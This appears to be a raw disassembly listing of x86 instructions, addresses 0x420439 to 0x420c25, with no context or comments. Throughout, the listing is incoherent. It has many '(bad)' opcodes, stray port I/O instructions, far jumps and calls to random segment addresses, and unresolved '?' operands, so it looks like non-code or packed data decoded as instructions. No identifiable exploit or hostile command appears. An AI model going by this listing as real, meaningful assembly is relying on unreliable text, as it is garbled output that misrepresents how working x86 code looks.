  420439:	jnp    0x4204a0
  42043b:	and    eax,0x2269621e
  420440:	outs   dx,BYTE PTR ds:[esi]
  420441:	push   ds
  420442:	addr16 pop ds
  420444:	test   DWORD PTR [esi-0x78],ebx
  420447:	loop   0x420439
  420449:	adc    DWORD PTR [ebx+0x77c7dea4],ebx
  42044f:	(bad)  
  420450:	loopne 0x420428
  420452:	dec    esp
  420453:	(bad)  
  420454:	int3   
  420455:	jno    0x420479
  420457:	loopne 0x42049f
  420459:	mov    BYTE PTR [esp+esi*8-0x33],al
  42045d:	imul   ecx,DWORD PTR [edx+eiz*4],0xdf60f043
  420464:	mov    bl,0x67
  420466:	mov    ah,dh
  420468:	mov    ecx,0x485967eb
  42046d:	gs ins BYTE PTR es:[edi],dx
  42046f:	jns    0x42048b
  420471:	pop    ebp
  420472:	retf   0xacb5
  420475:	fidiv  DWORD PTR [eax-0x32]
  420478:	imul   eax,DWORD PTR [esi+eiz*1-0x1b7bf44c],0xb3b48979
  420483:	(bad)  
  420484:	cmovbe ecx,DWORD PTR [ecx]
  420487:	mov    dl,0xa9
  420489:	(bad)  
  42048a:	mov    dl,0x3e
  42048c:	out    dx,eax
  42048d:	outs   dx,DWORD PTR ds:[esi]
  42048e:	(bad)
  420491:	fsubrp st(7),st
  420493:	lods   eax,DWORD PTR ds:[esi]
  420494:	add    dh,ah
  420496:	and    ah,BYTE PTR [ecx+edi*1]
  420499:	imul   edi,ebp,0xffffffde
  42049c:	jnp    0x42042c
  42049e:	add    BYTE PTR [esi+0x3],dl
  4204a1:	push   ss
  4204a2:	lahf   
  4204a3:	xchg   BYTE PTR [edx-0x16],dh
  4204a6:	lds    edx,FWORD PTR ds:0x606b3a53
  4204ac:	test   al,0x58
  4204ae:	cmp    BYTE PTR [ebp-0x2d5d3034],bl
  4204b4:	sbb    dh,BYTE PTR [edx+esi*8-0x47018b80]
  4204bb:	xchg   edx,eax
  4204bc:	inc    esi
  4204bd:	clc    
  4204be:	stos   BYTE PTR es:[edi],al
  4204bf:	mov    esi,0xf99d8648
  4204c4:	aaa    
  4204c5:	mov    bh,0x49
  4204c7:	dec    edx
  4204c8:	jbe    0x420527
  4204ca:	int    0x1b
  4204cc:	aaa    
  4204cd:	imul   edi,DWORD PTR [esi+0x58],0xffffffb3
  4204d1:	fs xchg esp,eax
  4204d3:	pop    esi
  4204d4:	push   ebp
  4204d5:	mov    ebx,0xbeab1d3a
  4204da:	mov    dh,0x6d
  4204dc:	mov    ds:0x3f591815,al
  4204e1:	and    dh,BYTE PTR [edx+0x2a97410]
  4204e7:	add    al,0x9b
  4204e9:	mov    gs,WORD PTR [esi-0x23aab803]
  4204ef:	mov    al,ds:0xf63b521c
  4204f4:	xchg   edi,eax
  4204f5:	xchg   ecx,eax
  4204f6:	jb     0x42055f
  4204f8:	mov    cl,0xbe
  4204fa:	pusha  
  4204fb:	pop    ebx
  4204fc:	lea    ecx,[edi+0x6d]
  4204ff:	mov    ds:0xf996f942,eax
  420504:	push   esp
  420505:	dec    edx
  420506:	call   DWORD PTR [eax]
  420508:	pushf  
  420509:	out    0x4c,al
  42050b:	aam    0x23
  42050d:	jp     0x4204af
  42050f:	jbe    0x4204f9
  420511:	or     al,0x79
  420513:	std    
  420514:	dec    ecx
  420515:	in     eax,dx
  420516:	xor    DWORD PTR [edi],ebx
  420518:	jae    0x420513
  42051a:	mov    cl,0x53
  42051c:	cmc    
  42051d:	adc    dh,dh
  42051f:	dec    edi
  420520:	cmp    ah,bl
  420522:	or     ch,BYTE PTR [edi+0x39]
  420525:	fst    QWORD PTR ds:0x5479f43a
  42052b:	cvtps2pd xmm4,QWORD PTR [ecx+0xbbaaa98]
  420532:	mov    ebx,0xe682679a
  420537:	in     al,dx
  420538:	lea    esp,[di]
  42053b:	jmp    0x420508
  42053d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053e:	mov    ebp,0xa8b22905
  420543:	inc    edx
  420544:	mov    bh,0x87
  420546:	pop    ss
  420547:	test   DWORD PTR [edx+0x2a],edi
  42054a:	(bad)  
  42054c:	(bad)  
  42054d:	cdq    
  42054e:	inc    ecx
  42054f:	pop    eax
  420550:	iret   
  420551:	cmp    cl,BYTE PTR [esi-0x8]
  420554:	cli    
  420555:	lods   al,BYTE PTR ds:[esi]
  420556:	xor    eax,0x86908bc3
  42055b:	std    
  42055c:	out    0xac,eax
  42055e:	cmp    al,0xe8
  420560:	clc    
  420561:	shl    BYTE PTR [ebx-0x258f6b94],0xcd
  420568:	cmp    ebp,ebx
  42056a:	test   DWORD PTR [ecx+0x2e],esi
  42056d:	imul   ecx,ebx,0x30
  420570:	(bad)  
  420571:	pop    ebp
  420572:	xchg   esp,eax
  420573:	pushf  
  420574:	fisttp WORD PTR [eax-0x1bb08952]
  42057a:	sti    
  42057b:	mov    al,0xcc
  42057d:	add    eax,0x5f3403ef
  420582:	xor    al,BYTE PTR [ebx+ebp*1]
  420585:	pop    edx
  420586:	icebp  
  420587:	cmp    BYTE PTR [esi+0x228c53de],bh
  42058d:	aam    0xdb
  42058f:	imul   esp,DWORD PTR [edi],0xf411fc7f
  420595:	aaa    
  420596:	sub    BYTE PTR [ebx],cl
  420598:	rol    DWORD PTR ds:0xd299e09,0x54
  42059f:	mov    eax,ds:0x26d24e68
  4205a4:	mov    bh,0xbe
  4205a6:	rcr    BYTE PTR ds:0x63a947a4,1
  4205ac:	js     0x4205ed
  4205ae:	inc    ebp
  4205af:	in     eax,0xd4
  4205b1:	sbb    cl,0x93
  4205b4:	add    BYTE PTR [edx],0x2f
  4205b7:	idiv   BYTE PTR [ecx-0x4db243ec]
  4205bd:	adc    eax,0xb327ab15
  4205c2:	push   0xffffffb8
  4205c4:	pusha  
  4205c5:	inc    ebp
  4205c6:	xor    DWORD PTR [esi-0x6685ed3d],0x1e
  4205cd:	outs   dx,BYTE PTR ds:[esi]
  4205ce:	pop    es
  4205cf:	sbb    BYTE PTR [eax-0x584ce8ca],dh
  4205d5:	cmp    DWORD PTR [eax+0x27],eax
  4205d8:	dec    ecx
  4205d9:	daa    
  4205da:	sbb    eax,0xc78e302c
  4205df:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4205e1:	dec    ebx
  4205e2:	xor    eax,0x6721f03c
  4205e7:	mov    edx,0xf611bded
  4205ec:	mov    eax,ds:0x7676d427
  4205f1:	mov    esp,0x34a79061
  4205f6:	bound  ecx,QWORD PTR [esi]
  4205f8:	add    dl,BYTE PTR [edx]
  4205fa:	pop    ecx
  4205fb:	rol    edx,0x20
  4205fe:	pop    edi
  4205ff:	mov    ebx,0xbd94c5dd
  420604:	mov    ?,WORD PTR [edi]
  420606:	jmp    0x3ba5c1f8
  42060b:	aam    0x94
  42060d:	mov    edi,0x315c2fba
  420612:	aaa    
  420613:	les    esi,FWORD PTR [eax]
  420615:	add    dl,cl
  420617:	xlat   BYTE PTR ds:[ebx]
  420618:	sub    esi,DWORD PTR [ecx-0x28]
  42061b:	push   esp
  42061c:	sti    
  42061d:	sahf   
  42061e:	and    al,0x4c
  420620:	jmp    0xf34204de
  420625:	scas   al,BYTE PTR es:[edi]
  420626:	cmp    cl,dh
  420628:	pop    esi
  420629:	xor    BYTE PTR [ebx+0x1032fade],dl
  42062f:	or     al,0x9b
  420631:	add    esi,DWORD PTR [eax+0x7c]
  420634:	outs   dx,DWORD PTR ds:[esi]
  420635:	jmp    0x42067e
  420637:	dec    eax
  420638:	add    al,0x61
  42063a:	ret    0x9696
  42063d:	push   0x50
  42063f:	cld    
  420640:	pusha  
  420641:	into   
  420642:	pop    ebp
  420643:	test   BYTE PTR [edi+0x32],al
  420646:	pop    eax
  420647:	(bad)  
  420648:	(bad)  
  420649:	aam    0xae
  42064b:	and    DWORD PTR [bx],eax
  42064e:	mov    ebx,0xb95a6e40
  420653:	dec    esi
  420654:	mov    ebx,0x5566809d
  420659:	leave  
  42065a:	pop    ds
  42065b:	push   edx
  42065c:	sbb    ah,BYTE PTR [esi]
  42065e:	lea    edx,[ebp-0x1]
  420661:	push   ebx
  420662:	sub    eax,0xb3d05052
  420667:	std    
  420668:	repz dec esp
  42066a:	adc    BYTE PTR [ebp-0x7d61cade],dl
  420670:	jle    0x4206d0
  420672:	(bad)  
  420673:	in     al,dx
  420674:	mov    ecx,0xddf51a4a
  420679:	dec    esi
  42067a:	js     0x420670
  42067c:	push   cs
  42067d:	sar    eax,1
  42067f:	adc    BYTE PTR [eax],dl
  420681:	xchg   edi,eax
  420682:	jns    0x420609
  420684:	push   ds
  420685:	xchg   DWORD PTR ds:0x6c10bd72,esp
  42068b:	adc    eax,0x1adeea74
  420690:	jns    0x42068f
  420692:	fnstsw WORD PTR [edi]
  420694:	xor    edi,DWORD PTR [ebx+0x193ef562]
  42069a:	mov    esp,0xe30f120e
  42069f:	adc    BYTE PTR [ecx],0x4c
  4206a2:	and    esp,ebx
  4206a4:	mov    BYTE PTR [ebp+0x5ecaba57],dl
  4206aa:	push   ecx
  4206ab:	cmp    esi,edx
  4206ad:	inc    esi
  4206ae:	clc    
  4206af:	mov    eax,0x934ece67
  4206b4:	mov    eax,ds:0x79754e02
  4206b9:	or     DWORD PTR [ebp+ebx*2-0x6c],eax
  4206bd:	fwait
  4206be:	lahf   
  4206bf:	push   eax
  4206c0:	push   edx
  4206c1:	xor    esi,eax
  4206c3:	scas   eax,DWORD PTR es:[edi]
  4206c4:	mov    BYTE PTR ds:0x207b54f3,dl
  4206ca:	jmp    0x33d0:0x776d9c79
  4206d1:	adc    DWORD PTR [esi+0x4f825099],ecx
  4206d7:	push   ss
  4206d8:	cli    
  4206d9:	lods   al,BYTE PTR ds:[esi]
  4206da:	cmp    edi,eax
  4206dc:	lahf   
  4206dd:	retf   0xcfe7
  4206e0:	iret   
  4206e1:	inc    edx
  4206e2:	sub    esp,DWORD PTR [esi+0x46c9457d]
  4206e8:	inc    esi
  4206e9:	mov    al,bh
  4206eb:	arpl   WORD PTR [ecx+0x3ab0ec3f],dx
  4206f1:	inc    esp
  4206f2:	sub    al,0x7f
  4206f4:	mov    bh,0x4a
  4206f6:	scas   al,BYTE PTR es:[edi]
  4206f7:	mov    ebp,0xff293855
  4206fc:	mov    bh,0x89
  4206fe:	inc    edx
  4206ff:	je     0x4206da
  420701:	pop    ebp
  420702:	cmp    edx,edx
  420704:	adc    DWORD PTR ss:[edi-0x28547d31],esp
  42070b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42070c:	or     dh,BYTE PTR ds:0xfe01034f
  420712:	inc    ecx
  420713:	ror    BYTE PTR [ecx],0x46
  420716:	push   eax
  420717:	hlt    
  420718:	adc    DWORD PTR [ebp+esi*4-0x26860e00],esi
  42071f:	call   0xb1d0c5ac
  420724:	ss jb  0x420785
  420727:	in     eax,dx
  420728:	mov    ebx,0x512f4983
  42072d:	das    
  42072e:	xchg   BYTE PTR [ebp-0x4f955690],al
  420734:	xchg   edi,eax
  420735:	jae    0x42077d
  420737:	je     0xbd6228b1
  42073d:	test   eax,0xeb48e53c
  420742:	mov    ds:0x901ff9fd,al
  420747:	push   ecx
  420748:	xor    BYTE PTR [edx],dh
  42074a:	cmp    DWORD PTR [edi+0x68f21055],0xd5bdc752
  420754:	jmp    0x340d9c00
  420759:	es loope 0x4206e9
  42075c:	inc    ebx
  42075d:	xchg   BYTE PTR [ebx+0x56],dh
  420760:	clc    
  420761:	push   eax
  420762:	lds    ebp,FWORD PTR [ecx-0xf]
  420765:	adc    eax,0xd7545558
  42076a:	jmp    0x420735
  42076c:	fimul  WORD PTR [eax]
  42076e:	je     0x42077c
  420770:	mov    ebx,0xa6bd7a3d
  420775:	pop    edx
  420776:	aad    0x72
  420778:	popa   
  420779:	jnp    0x420765
  42077b:	mov    dl,0x7a
  42077d:	arpl   WORD PTR [ebx+ebp*8-0xf51bc3b],sp
  420784:	repz fiadd DWORD PTR [edx+0x2b0dbcc7]
  42078b:	xchg   esi,eax
  42078c:	inc    esp
  42078d:	clc    
  42078e:	cmp    al,0x95
  420790:	sub    al,BYTE PTR [ecx-0x3957045f]
  420796:	sub    BYTE PTR [eax+0x55],0x69
  42079a:	jb     0x4207e5
  42079c:	je     0x420780
  42079e:	sbb    eax,DWORD PTR [eax+0x42]
  4207a1:	jg     0x420816
  4207a3:	lahf   
  4207a4:	inc    esp
  4207a5:	push   edx
  4207a6:	add    ebx,DWORD PTR [ecx+0x60]
  4207a9:	jecxz  0x420789
  4207ab:	jnp    0x4207b2
  4207ad:	pop    edi
  4207ae:	add    al,0x4d
  4207b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207b1:	ror    BYTE PTR [esi],0x3c
  4207b4:	dec    esi
  4207b5:	push   edx
  4207b6:	out    0x25,al
  4207b8:	imul   esp,esi,0xe2ab12ee
  4207be:	lahf   
  4207bf:	shl    esp,cl
  4207c1:	dec    ecx
  4207c2:	jge    0x420822
  4207c4:	retf   
  4207c5:	test   al,0x6d
  4207c7:	cmc    
  4207c8:	inc    esp
  4207c9:	push   esp
  4207ca:	cli    
  4207cb:	and    edi,DWORD PTR [edi+eiz*2]
  4207ce:	and    DWORD PTR ds:0x32147156,edi
  4207d4:	aas    
  4207d5:	dec    ebp
  4207d6:	dec    esi
  4207d7:	jmp    0x487b:0xdb4d24eb
  4207de:	jle    0x42084c
  4207e0:	mov    esi,0x4126c814
  4207e5:	loope  0x4207c6
  4207e7:	pop    ss
  4207e8:	jbe    0x4207bd
  4207ea:	sbb    al,0x93
  4207ec:	or     edi,ebp
  4207ee:	dec    ebp
  4207ef:	add    eax,0xfdca50ad
  4207f4:	pop    es
  4207f5:	call   0xf9f1:0x677c5bab
  4207fc:	cmc    
  4207fd:	imul   eax,DWORD PTR [ebx-0x33],0xffffffb4
  420801:	dec    edx
  420802:	out    0xea,eax
  420804:	aad    0xfe
  420806:	imul   edi,DWORD PTR [edi-0x7c],0xbf1b8a42
  42080d:	mov    eax,DWORD PTR [ebx+0x538ec0fe]
  420813:	mov    ebp,0xd675b7e5
  420818:	inc    edx
  420819:	mov    eax,0xe9525339
  42081e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42081f:	std    
  420820:	adc    eax,0xe4eb5ccf
  420825:	outs   dx,BYTE PTR ds:[esi]
  420826:	iret   
  420827:	dec    eax
  420828:	cli    
  420829:	sbb    al,BYTE PTR [ebx-0x39]
  42082c:	xor    BYTE PTR [ecx+ecx*4+0x79],al
  420830:	sbb    BYTE PTR [ebx-0x616ee911],bl
  420836:	int3   
  420837:	call   0x62df:0xf31962b7
  42083e:	dec    edx
  42083f:	mov    bh,0xd1
  420841:	xchg   edx,eax
  420842:	cmp    eax,0x226685a
  420847:	rcl    bl,1
  420849:	mov    dh,0x6f
  42084b:	mov    WORD PTR [edi-0x2cbb242f],gs
  420851:	sbb    DWORD PTR [esi+0x15],0xe19254de
  420858:	lods   eax,DWORD PTR ds:[esi]
  420859:	mov    esp,0xe239121d
  42085e:	sub    bl,BYTE PTR [ebx]
  420860:	call   0xc4594ff0
  420865:	outs   dx,DWORD PTR ds:[esi]
  420866:	xor    edi,DWORD PTR [edi+0x1]
  420869:	mov    edi,0xfd62e5f3
  42086e:	jns    0x42086e
  420870:	sahf   
  420871:	inc    ebx
  420872:	loope  0x420806
  420874:	sahf   
  420875:	fwait
  420876:	(bad)  
  420877:	cld    
  420878:	sub    edi,DWORD PTR [edx]
  42087a:	or     BYTE PTR [ebx+ebx*4+0x31bae1ae],cl
  420881:	push   edi
  420882:	ins    BYTE PTR es:[edi],dx
  420883:	jno    0x42084f
  420885:	mov    ah,0x4d
  420887:	sub    eax,0x9451785e
  42088c:	out    0xc5,eax
  42088e:	jbe    0x42090a
  420890:	push   0xffffffe5
  420892:	je     0x42085c
  420894:	or     DWORD PTR [edx+0x528d01a7],0x7d7f4dc0
  42089e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42089f:	pop    ebp
  4208a0:	loope  0x42090f
  4208a2:	xlat   BYTE PTR ds:[ebx]
  4208a3:	mov    ch,0x9e
  4208a5:	pop    ebx
  4208a6:	sub    ah,dh
  4208a8:	push   es
  4208a9:	and    al,BYTE PTR [esi]
  4208ab:	jbe    0x4208e8
  4208ad:	arpl   WORD PTR [ecx],dx
  4208af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b0:	mov    ah,0xfe
  4208b2:	in     eax,0xa9
  4208b4:	call   0xaf0d:0x8e9cbdbc
  4208bb:	sti    
  4208bc:	sub    DWORD PTR ds:0x95ccecdb,esi
  4208c2:	adc    ah,BYTE PTR [eax-0x23de2c87]
  4208c8:	iret   
  4208c9:	arpl   cx,si
  4208cb:	bound  eax,QWORD PTR [ecx-0x1e1084f1]
  4208d1:	outs   dx,DWORD PTR ds:[esi]
  4208d2:	test   DWORD PTR [ecx+0x1f],ebp
  4208d5:	inc    esi
  4208d6:	ret    0x4b0a
  4208d9:	imul   edi,DWORD PTR ds:0xe00c772,0xffffffd1
  4208e0:	in     eax,dx
  4208e1:	sti    
  4208e2:	adc    ecx,eax
  4208e4:	dec    ebp
  4208e5:	out    dx,eax
  4208e6:	in     eax,0x8f
  4208e8:	push   ebp
  4208e9:	leave  
  4208ea:	dec    ebp
  4208eb:	pop    edi
  4208ec:	add    BYTE PTR [ebx+0xebb54f8],dl
  4208f2:	and    BYTE PTR [edx],0xc6
  4208f5:	xor    edi,DWORD PTR [eax]
  4208f7:	adc    al,0x50
  4208f9:	add    DWORD PTR [ebx-0x5a],edx
  4208fc:	push   cs
  4208fd:	jge    0x420967
  4208ff:	ss adc eax,0x3c9dd55c
  420905:	push   0xfe5eed6a
  42090a:	stos   BYTE PTR es:[edi],al
  42090b:	push   esp
  42090c:	dec    DWORD PTR [eax-0x48]
  42090f:	mov    bl,0xab
  420911:	sub    dh,BYTE PTR ds:0xa5f6e37a
  420917:	sub    eax,0x29eea608
  42091c:	cmc    
  42091d:	cli    
  42091e:	mov    ds:0xc9861dbc,eax
  420923:	sbb    esp,ecx
  420925:	inc    esi
  420926:	test   BYTE PTR [eax-0x25],bl
  420929:	xor    ecx,DWORD PTR [edi-0x4bf20041]
  42092f:	popa   
  420930:	pop    esp
  420931:	js     0x420994
  420933:	sub    ch,BYTE PTR [edx+0x2db7cef4]
  420939:	and    al,0xfd
  42093b:	sbb    eax,0x77add9cd
  420940:	pop    eax
  420941:	ficom  WORD PTR [eax+0x64]
  420944:	pop    ds
  420945:	xchg   ebx,eax
  420946:	or     BYTE PTR [ecx+eiz*4-0x31],cl
  42094a:	popf   
  42094b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42094c:	retf   
  42094d:	sahf   
  42094e:	sub    BYTE PTR [eax+ebp*1],ch
  420951:	nop
  420952:	xchg   ecx,eax
  420953:	pushf  
  420954:	push   ds
  420955:	cmp    edx,DWORD PTR [edx]
  420957:	(bad)  
  420958:	loope  0x4209ab
  42095a:	repnz (bad) 
  42095c:	sbb    al,0xa8
  42095e:	mov    ebx,0x82ffbe35
  420963:	xchg   ebp,eax
  420964:	les    ebx,FWORD PTR [edi-0x2c]
  420967:	ficom  DWORD PTR [eax]
  420969:	inc    ebx
  42096a:	cmp    eax,0x78f01cb9
  42096f:	jno    0x4209a8
  420971:	or     al,0x37
  420973:	push   es
  420974:	into   
  420975:	jno    0x420955
  420977:	fs sbb eax,0x788ddbfb
  42097d:	int3   
  42097e:	in     al,dx
  42097f:	in     al,0x60
  420981:	frstor [ebp+0x6]
  420984:	xor    eax,0x388f7c6a
  420989:	gs adc eax,0x9789d3c4
  42098f:	stos   DWORD PTR es:[edi],eax
  420990:	jg     0x4209e5
  420992:	mov    ds:0x32e280b1,al
  420997:	add    ch,0xdc
  42099a:	mov    esp,0x92255d2a
  42099f:	jg     0x42095b
  4209a1:	xchg   ebx,eax
  4209a2:	sbb    al,0xe1
  4209a4:	aad    0x5a
  4209a6:	sub    eax,0x7f0177ed
  4209ab:	sub    DWORD PTR [ebx-0x5],0x3717d8d7
  4209b2:	lods   eax,DWORD PTR ds:[esi]
  4209b3:	add    ah,BYTE PTR [eax]
  4209b5:	push   esp
  4209b6:	bound  edx,QWORD PTR [edi-0xa6764da]
  4209bc:	cmp    BYTE PTR [ecx+0x5b0c0ae2],ah
  4209c2:	mov    BYTE PTR [esi],0x10
  4209c5:	jmp    0x420965
  4209c7:	dec    ebx
  4209c8:	jmp    0x8c30786a
  4209cd:	idiv   BYTE PTR [ebx+eax*1-0x369059c7]
  4209d4:	dec    edx
  4209d5:	adc    esi,DWORD PTR [ecx-0x44]
  4209d8:	sbb    ebx,DWORD PTR [esi]
  4209da:	xchg   BYTE PTR [ebx+0x125fb8f2],ch
  4209e0:	jne    0x420965
  4209e2:	out    dx,al
  4209e3:	pusha  
  4209e4:	sbb    DWORD PTR [edi+eiz*2-0x5f3fd1be],esi
  4209eb:	ins    DWORD PTR es:[edi],dx
  4209ec:	dec    ecx
  4209ed:	fist   WORD PTR [edi+0x4359bce5]
  4209f3:	in     eax,0x5e
  4209f5:	rcr    DWORD PTR [edi-0x7f],0x89
  4209f9:	std    
  4209fa:	push   ss
  4209fb:	xchg   esi,eax
  4209fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209fe:	out    dx,al
  4209ff:	mov    bl,0xe8
  420a01:	pop    ebp
  420a02:	call   0x4fad:0xd1dfd4a
  420a09:	push   0x9
  420a0b:	cmp    eax,0x71f9f07f
  420a10:	jns    0x4209d8
  420a12:	jg     0x420a12
  420a14:	sub    DWORD PTR [eax+0x572f95c6],0xffffffee
  420a1b:	pop    es
  420a1c:	rep outs dx,BYTE PTR ds:[esi]
  420a1e:	pop    es
  420a1f:	repz mov ?,WORD PTR [ebp+0x59]
  420a23:	aad    0x32
  420a25:	enter  0xee0,0xec
  420a29:	inc    ebx
  420a2a:	mov    al,0xb9
  420a2c:	dec    edi
  420a2d:	pop    es
  420a2e:	push   cs
  420a2f:	shr    DWORD PTR [ebx+ebp*2+0x4c],1
  420a33:	cdq    
  420a34:	arpl   WORD PTR [edx+edi*8],di
  420a37:	xor    al,0xb1
  420a39:	xchg   esp,eax
  420a3a:	inc    ebx
  420a3b:	inc    eax
  420a3c:	cwde   
  420a3d:	stc    
  420a3e:	cmp    cl,BYTE PTR ds:0x3b3a650b
  420a44:	ret    0x12b5
  420a47:	popa   
  420a48:	fnstenv [edi-0x1a0312a7]
  420a4e:	jne    0x420aaa
  420a50:	adc    al,0x7e
  420a52:	push   esp
  420a53:	int    0xea
  420a55:	(bad)  
  420a56:	stc    
  420a57:	pop    ebx
  420a58:	push   ss
  420a59:	in     eax,dx
  420a5a:	sub    eax,0x7b1794ef
  420a5f:	iret   
  420a60:	in     eax,0xa2
  420a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a63:	dec    esp
  420a64:	sar    BYTE PTR [eax+0x2e],1
  420a67:	push   ebx
  420a68:	jbe    0x420a30
  420a6a:	ins    BYTE PTR es:[edi],dx
  420a6b:	cmp    DWORD PTR [esi-0x617a0eb],esi
  420a71:	mov    al,ds:0x630202bb
  420a76:	xchg   edi,eax
  420a77:	loope  0x420a92
  420a79:	jmp    0x25e3:0x5718aaca
  420a80:	enter  0x85d4,0x91
  420a84:	loop   0x420a16
  420a86:	push   ds
  420a87:	fsubr  QWORD PTR [edi]
  420a89:	data16 xor ah,BYTE PTR [eax+0x18]
  420a8d:	iret   
  420a8e:	stos   DWORD PTR es:[edi],eax
  420a8f:	push   edx
  420a90:	in     eax,0x61
  420a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a93:	jne    0x420a88
  420a95:	mov    ss,WORD PTR [ecx]
  420a97:	pop    esi
  420a98:	fs ror cl,1
  420a9b:	jnp    0x420ae1
  420a9d:	dec    ebp
  420a9e:	adc    BYTE PTR [ecx+0x73],ah
  420aa1:	mov    cl,0x4d
  420aa3:	(bad)  
  420aa5:	mov    ebx,0x597a6f77
  420aaa:	mov    ecx,0x4615a701
  420aaf:	and    al,0xe
  420ab1:	add    bh,BYTE PTR [edx-0x1144ee84]
  420ab7:	hlt    
  420ab8:	imul   edi,DWORD PTR [ebx-0x74a7f70e],0xe831f068
  420ac2:	mov    al,ds:0xbd45c883
  420ac7:	rcr    DWORD PTR [ecx],cl
  420ac9:	(bad)  
  420aca:	int    0x66
  420acc:	xor    edi,ecx
  420ace:	repz push ss
  420ad0:	ds repnz hlt 
  420ad3:	sub    al,0x3d
  420ad5:	out    dx,al
  420ad6:	or     eax,0xb225c3ed
  420adb:	dec    edi
  420add:	push   edx
  420ade:	fimul  WORD PTR [esi]
  420ae0:	jns    0x420b2f
  420ae2:	out    dx,eax
  420ae3:	xor    BYTE PTR [ecx-0x6a4a2d91],0x7
  420aea:	stos   BYTE PTR es:[edi],al
  420aeb:	cmp    esi,DWORD PTR [esi-0x29]
  420aee:	or     DWORD PTR [esi-0x13],edx
  420af1:	sbb    edi,DWORD PTR [edi]
  420af3:	cmp    eax,0x83ff2e53
  420af8:	jp     0x420a87
  420afa:	push   cs
  420afb:	jp     0x420b3f
  420afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420afe:	push   es
  420aff:	cmp    al,0xbc
  420b01:	jecxz  0x420ad4
  420b03:	add    eax,DWORD PTR [ecx+0x9]
  420b06:	pop    esi
  420b07:	pop    ds
  420b08:	fist   WORD PTR [ecx-0x67]
  420b0b:	(bad)  
  420b0c:	fisubr DWORD PTR [ecx-0x7c]
  420b0f:	addr16 je 0x420ac8
  420b12:	adc    BYTE PTR [eax],dh
  420b14:	fs push 0xffffffa2
  420b17:	adc    al,0x39
  420b19:	js     0x420b2a
  420b1b:	push   ds
  420b1c:	pop    ecx
  420b1d:	cmc    
  420b1e:	arpl   cx,si
  420b20:	mov    edi,0x1b7dbda1
  420b25:	or     bl,bl
  420b27:	(bad)  
  420b28:	jle    0x420b2a
  420b2a:	adc    al,0x12
  420b2c:	(bad)  
  420b2d:	pop    edx
  420b2e:	or     BYTE PTR [bp+si-0x4c21],bh
  420b33:	cmp    eax,0x26e89e42
  420b38:	mov    esi,edx
  420b3a:	jecxz  0x420bba
  420b3c:	jnp    0x420b60
  420b3e:	sbb    eax,esp
  420b40:	rcr    edx,0x78
  420b43:	jle    0x420b52
  420b45:	or     DWORD PTR [ecx+eiz*1],0xe9906fed
  420b4c:	clc    
  420b4d:	jl     0x420ba8
  420b4f:	lock xchg DWORD PTR [ebx+0x7f],esi
  420b53:	xchg   edi,eax
  420b54:	test   al,0xc0
  420b56:	dec    DWORD PTR [ebx+0x548af94a]
  420b5c:	mov    eax,0x4035914c
  420b61:	jbe    0x420bd6
  420b63:	ror    DWORD PTR [eax+0x3a],1
  420b66:	mov    bl,0xa7
  420b68:	repnz imul ebx,DWORD PTR ds:0x159b5307,0xffffffb9
  420b70:	into   
  420b71:	call   DWORD PTR [edi-0x55]
  420b74:	mov    esp,0xf105fedf
  420b79:	ficomp WORD PTR [ebp-0x62]
  420b7c:	push   cs
  420b7d:	push   ecx
  420b7e:	(bad)  
  420b7f:	fstp   DWORD PTR [ecx]
  420b81:	inc    edx
  420b82:	out    0x49,al
  420b84:	retf   0x674a
  420b87:	dec    esp
  420b88:	or     esi,ebp
  420b8a:	inc    eax
  420b8b:	iret   
  420b8c:	inc    ecx
  420b8d:	das    
  420b8e:	popa   
  420b8f:	pop    ebp
  420b90:	(bad)  
  420b92:	or     BYTE PTR [ecx+edx*2],cl
  420b95:	push   edx
  420b96:	push   ss
  420b97:	imul   edx,DWORD PTR [esi+0x1a],0x2a
  420b9b:	(bad)  
  420b9c:	mov    ah,0x2f
  420b9e:	or     BYTE PTR [edi+0x4f],al
  420ba1:	fucomp st(4)
  420ba3:	test   DWORD PTR [ebx+0x2c091b76],edi
  420ba9:	je     0x420ba8
  420bab:	stos   BYTE PTR es:[edi],al
  420bac:	xchg   esi,eax
  420bad:	iret   
  420bae:	out    dx,eax
  420baf:	lahf   
  420bb0:	xor    dl,BYTE PTR [ebp-0x52c3641a]
  420bb6:	fwait
  420bb7:	outs   dx,BYTE PTR ds:[esi]
  420bb8:	and    DWORD PTR ds:0x90314114,ecx
  420bbe:	in     al,dx
  420bbf:	and    eax,0xdbaa68a6
  420bc4:	add    DWORD PTR [esi-0x3d7c599a],ecx
  420bca:	xlat   BYTE PTR ds:[ebx]
  420bcb:	(bad)  
  420bcc:	ins    DWORD PTR es:[edi],dx
  420bcd:	call   0xd06c:0xfad753c0
  420bd4:	jmp    0x3eae:0xa9470735
  420bdb:	jle    0x420bba
  420bdd:	ds aaa 
  420bdf:	cmp    BYTE PTR [ebx+0x2331565f],bl
  420be5:	add    eax,0x58c5fbee
  420bea:	dec    ecx
  420beb:	in     eax,0xd0
  420bed:	push   edi
  420bee:	pusha  
  420bef:	push   ss
  420bf0:	jmp    0xc88ab487
  420bf5:	push   esi
  420bf6:	push   esi
  420bf7:	pop    edx
  420bf8:	xchg   ecx,eax
  420bf9:	jmp    0x420c2c
  420bfb:	push   ebp
  420bfc:	cmc    
  420bfd:	xor    al,al
  420bff:	outs   dx,BYTE PTR ds:[esi]
  420c00:	pop    ebx
  420c01:	add    BYTE PTR [eax],al
  420c03:	lea    ecx,[ebx+0x38ac011c]
  420c09:	adc    BYTE PTR [ebp+0x69ec7384],0x47
  420c10:	jp     0x420b97
  420c12:	popf   
  420c13:	mov    BYTE PTR [eax+eax*8-0x7e],cl
  420c17:	xor    eax,DWORD PTR [edi+esi*8]
  420c1a:	std    
  420c1b:	out    dx,al
  420c1c:	sbb    ecx,edx
  420c1e:	and    BYTE PTR ds:0x580df6cb,bh
  420c24:	icebp  
  420c25:	mov    ebp,0x755c5fce
